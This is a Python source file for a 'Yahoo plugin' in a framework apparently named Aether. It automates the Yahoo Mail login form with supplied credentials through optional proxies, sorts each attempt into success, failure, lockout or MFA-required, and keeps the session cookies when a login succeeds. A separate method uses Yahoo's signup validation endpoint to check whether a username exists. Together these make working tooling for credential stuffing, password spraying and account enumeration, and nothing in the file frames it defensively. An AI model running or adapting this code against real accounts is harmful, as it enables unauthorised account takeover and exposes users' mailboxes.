"""
Aether Yahoo Plugin
Full implementation with full login flow.
"""

import re
import json
from typing import Optional, Dict, Any
import asyncio

from ...core.plugin_interface import WebPlugin, LoginResult, AuthResult, SessionData


class YahooPlugin(WebPlugin):
    """Yahoo Mail authentication plugin."""
    
    name = "yahoo"
    version = "2.0.0"
    protocols = ["https"]
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.base_url = "https://login.yahoo.com"
        
    async def login(self, username: str, password: str,
                   session: Optional[Any] = None,
                   proxy: Optional[str] = None) -> LoginResult:
        """
        Yahoo login with full flow.
        """
        import httpx
        from bs4 import BeautifulSoup
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            
            async with httpx.AsyncClient(
                proxies=proxy,
                headers=headers,
                follow_redirects=True,
                timeout=30
            ) as client:
                
                # Step 1: Get login page
                login_page = await client.get(
                    f"{self.base_url}/",
                    params={"display": "login"}
                )
                
                soup = BeautifulSoup(login_page.text, 'html.parser')
                
                # Extract form data
                form = soup.find('form', {'name': 'login_form'})
                if not form:
                    return LoginResult(
                        result=AuthResult.ERROR,
                        username=username,
                        password=password,
                        message="Login form not found"
                    )
                
                login_data = {}
                for input_tag in form.find_all('input'):
                    name = input_tag.get('name')
                    if name:
                        login_data[name] = input_tag.get('value', '')
                
                # Set credentials
                login_data['username'] = username
                
                # Submit username
                user_resp = await client.post(
                    form.get('action', self.base_url),
                    data=login_data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                
                # Check if password page
                if "password" in str(user_resp.url) or "challenge" in user_resp.text.lower():
                    pass_soup = BeautifulSoup(user_resp.text, 'html.parser')
                    pass_form = pass_soup.find('form')
                    
                    if pass_form:
                        pass_data = {}
                        for inp in pass_form.find_all('input'):
                            name = inp.get('name')
                            if name:
                                pass_data[name] = inp.get('value', '')
                        
                        pass_data['password'] = password
                        
                        pass_resp = await client.post(
                            pass_form.get('action', self.base_url),
                            data=pass_data,
                            headers={"Content-Type": "application/x-www-form-urlencoded"}
                        )
                        
                        elapsed = (asyncio.get_event_loop().time() - start_time) * 1000
                        
                        # Check result
                        if "mail.yahoo.com" in str(pass_resp.url) or \
                           "my.yahoo.com" in str(pass_resp.url):
                            
                            session_data = SessionData(
                                cookies=dict(client.cookies),
                                user_agent=headers["User-Agent"],
                                proxy_used=proxy
                            )
                            
                            return LoginResult(
                                result=AuthResult.SUCCESS,
                                username=username,
                                password=password,
                                response_time_ms=elapsed,
                                session=session_data
                            )
                        
                        if "invalid password" in pass_resp.text.lower():
                            return LoginResult(
                                result=AuthResult.FAILURE,
                                username=username,
                                password=password,
                                response_time_ms=elapsed
                            )
                        
                        if "account is locked" in pass_resp.text.lower():
                            return LoginResult(
                                result=AuthResult.LOCKOUT,
                                username=username,
                                password=password,
                                response_time_ms=elapsed
                            )
                        
                        if "verification code" in pass_resp.text.lower():
                            return LoginResult(
                                result=AuthResult.MFA_REQUIRED,
                                username=username,
                                password=password,
                                response_time_ms=elapsed
                            )
                
                elapsed = (asyncio.get_event_loop().time() - start_time) * 1000
                
                return LoginResult(
                    result=AuthResult.UNKNOWN,
                    username=username,
                    password=password,
                    response_time_ms=elapsed
                )
                
        except Exception as e:
            return LoginResult(
                result=AuthResult.ERROR,
                username=username,
                password=password,
                message=str(e)
            )
    
    async def enumerate(self, username: str,
                       session: Optional[Any] = None,
                       proxy: Optional[str] = None) -> Any:
        """
        Yahoo username enumeration.
        """
        from ...core.plugin_interface import EnumerateResult
        
        try:
            import httpx
            
            async with httpx.AsyncClient(proxies=proxy, timeout=10) as client:
                # Yahoo leaks existence via sign up page
                resp = await client.get(
                    "https://login.yahoo.com/account/create",
                    params={"specId": "yidReg"}
                )
                
                # Check via their validation endpoint
                check_resp = await client.post(
                    "https://login.yahoo.com/account/module/create",
                    data={"validate": "yid", "yid": username},
                    headers={"X-Requested-With": "XMLHttpRequest"}
                )
                
                if "already taken" in check_resp.text.lower():
                    return EnumerateResult(
                        username=username,
                        exists=True,
                        confidence=0.9,
                        indicators=["Username taken"]
                    )
                
                return EnumerateResult(
                    username=username,
                    exists=None,
                    confidence=0.0
                )
                
        except Exception as e:
            return EnumerateResult(
                username=username,
                exists=None,
                confidence=0.0,
                indicators=[str(e)]
            )